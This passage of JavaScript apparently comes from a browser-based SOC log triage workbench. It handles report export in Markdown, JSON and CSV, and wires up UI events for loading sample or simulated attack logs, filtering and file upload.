        md += `| ${e.timestamp} | ${e.severity} | ${e.srcIP} | ${e.user} | ${e.threatName} | ${e.mitre} |\n`;
      });

      md += `\n## 3. Recommended Incident Response Playbooks (NIST SP 800-61)\n\n`;
      const uniquePlaybooks = new Map();
      state.parsedEvents.filter(e => e.severity === 'CRITICAL' || e.severity === 'HIGH').forEach(e => {
        if (!uniquePlaybooks.has(e.threatName)) {
          uniquePlaybooks.set(e.threatName, { playbook: e.playbook, cli: e.cliCommand });
        }
      });

      uniquePlaybooks.forEach((val, name) => {
        md += `### Playbook: ${name}\n`;
        md += `**Containment CLI:** \`${val.cli}\`\n\n`;
        val.playbook.forEach((s, idx) => {
          md += `${idx + 1}. ${s}\n`;
        });
        md += `\n`;
      });

      blob = new Blob([md], { type: 'text/markdown;charset=utf-8' });
    } else if (format === 'json') {
      filename = `AegisTrace-Triage-Data-${timestamp}.json`;
      const payload = {
        metadata: {
          tool: 'AegisTrace Security Workbench v3.0',
          author: 'Ayan Mondal',
          internId: 'CDS/INT/2026/26637504',
          organization: 'Codomax Digital Solutions',
          generatedAt: new Date().toISOString(),
          quarantinedIPs: Array.from(state.quarantinedIPs)
        },
        metrics: {
          total: state.parsedEvents.length,
          critical: state.parsedEvents.filter(e => e.severity === 'CRITICAL').length,
          high: state.parsedEvents.filter(e => e.severity === 'HIGH').length
        },
        events: state.parsedEvents
      };
      blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json;charset=utf-8' });
    } else if (format === 'csv') {
      filename = `AegisTrace-Events-${timestamp}.csv`;
      let csv = 'Index,Timestamp,Severity,SourceIP,User,ThreatName,Category,MitreID\n';
      state.filteredEvents.forEach(e => {
        csv += `"${e.index}","${e.timestamp}","${e.severity}","${e.srcIP}","${e.user}","${e.threatName.replace(/"/g, '""')}","${e.category.replace(/"/g, '""')}","${e.mitre}"\n`;
      });
      blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
    }

    if (blob) {
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      showToast(`Exported triage report as ${filename}`);
      playTone(1050, 'sine', 0.08);
    }
  };

  // --- Initialize Event Listeners ---
  function init() {
    const textarea = document.getElementById('log-input-box');
    const parseBtn = document.getElementById('btn-parse-logs');
    const clearBtn = document.getElementById('btn-clear-logs');
    const searchInput = document.getElementById('search-logs-input');
    const dropzone = document.getElementById('file-dropzone');
    const fileInput = document.getElementById('file-upload-input');
    const simulateBtn = document.getElementById('btn-simulate-event');
    const soundBtn = document.getElementById('sound-toggle-btn');

    // Audio toggle
    if (soundBtn) {
      soundBtn.addEventListener('click', () => {
        soundEnabled = !soundEnabled;
        if (soundEnabled) {
          initAudio();
          soundBtn.classList.add('active');
          soundBtn.innerHTML = '<span>🔊</span> Sound ON';
          playTone(880, 'sine', 0.1);
          showToast('Tactical SOC audio feedback enabled');
        } else {
          soundBtn.classList.remove('active');
          soundBtn.innerHTML = '<span>🔇</span> Sound OFF';
          showToast('Audio feedback muted');
        }
      });
    }

    // Preset buttons
    document.querySelectorAll('.btn-preset').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.btn-preset').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const presetKey = btn.getAttribute('data-preset');
        if (SAMPLE_LOGS[presetKey]) {
          textarea.value = SAMPLE_LOGS[presetKey];
          processLogs(textarea.value);
          showToast(`Loaded ${presetKey.toUpperCase()} attack scenario`);
          playTone(800, 'sine', 0.06);
        }
      });
    });

    // Manual Parse
    parseBtn.addEventListener('click', () => {
      if (!textarea.value.trim()) {
        showToast('Please paste or load log entries first.', 'warning');
        return;
      }
      processLogs(textarea.value);
      showToast('Successfully analyzed telemetry records');
      playTone(750, 'triangle', 0.08);
    });

    // Real-Time Attack Simulation Ingestion
    if (simulateBtn) {
      simulateBtn.addEventListener('click', () => {
        const randomAttack = SIMULATED_ATTACKS[Math.floor(Math.random() * SIMULATED_ATTACKS.length)];
        textarea.value = (textarea.value.trim() ? textarea.value.trim() + '\n' : '') + randomAttack;
        processLogs(textarea.value);
        showToast('Injected new live simulated attack telemetry!', 'critical');
        playTone(330, 'sawtooth', 0.15);
      });
    }

    // Clear
    clearBtn.addEventListener('click', () => {
      textarea.value = '';
      state.rawLogs = '';
      state.parsedEvents = [];
      state.filteredEvents = [];
      state.selectedEventId = null;
      state.quarantinedIPs.clear();
      document.querySelectorAll('.btn-preset').forEach(b => b.classList.remove('active'));
      applyFilters();
      updateMetrics();
      updateDistributionBar();
      updateThreatLevel();
      updateIoCSummary();
      showToast('Workspace reset to clean state');
      playTone(500, 'sine', 0.05);
    });

    // Search bar
    searchInput.addEventListener('input', (e) => {
      state.searchQuery = e.target.value;
      applyFilters();
    });

    // Severity Filters
    document.querySelectorAll('.filter-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        state.activeFilter = chip.getAttribute('data-filter');
        applyFilters();
        playTone(650, 'sine', 0.03);
      });
    });

    // File Upload / Dropzone
    dropzone.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = (event) => {
        textarea.value = event.target.result;
        processLogs(textarea.value);
        showToast(`Ingested log file: ${file.name}`);
        playTone(750, 'sine', 0.06);
      };
      reader.readAsText(file);
    });

    // Drag & Drop
    dropzone.addEventListener('dragover', (e) => {
      e.preventDefault();
      dropzone.style.borderColor = 'var(--neon-cyan)';
    });
    dropzone.addEventListener('dragleave', () => {
      dropzone.style.borderColor = 'var(--border-glass)';
    });
    dropzone.addEventListener('drop', (e) => {
      e.preventDefault();
      dropzone.style.borderColor = 'var(--border-glass)';
      if (e.dataTransfer.files && e.dataTransfer.files[0]) {
        const file = e.dataTransfer.files[0];
        const reader = new FileReader();
        reader.onload = (event) => {
          textarea.value = event.target.result;
          processLogs(textarea.value);
          showToast(`Ingested log file: ${file.name}`);
          playTone(750, 'sine', 0.06);
        };
        reader.readAsText(file);
      }
    });

    // Keyboard ESC to close modal
    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        window.closeModal();
      }
    });

    // Banner close
    const bannerCloseBtn = document.getElementById('close-disclaimer-btn');
    if (bannerCloseBtn) {
      bannerCloseBtn.addEventListener('click', () => {
        const banner = document.getElementById('disclaimer-banner');
        if (banner) banner.style.display = 'none';
      });
    }

    // Load initial mixed attack dataset
    const defaultBtn = document.querySelector('.btn-preset[data-preset="mixed"]');
    if (defaultBtn) {
      defaultBtn.click();
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
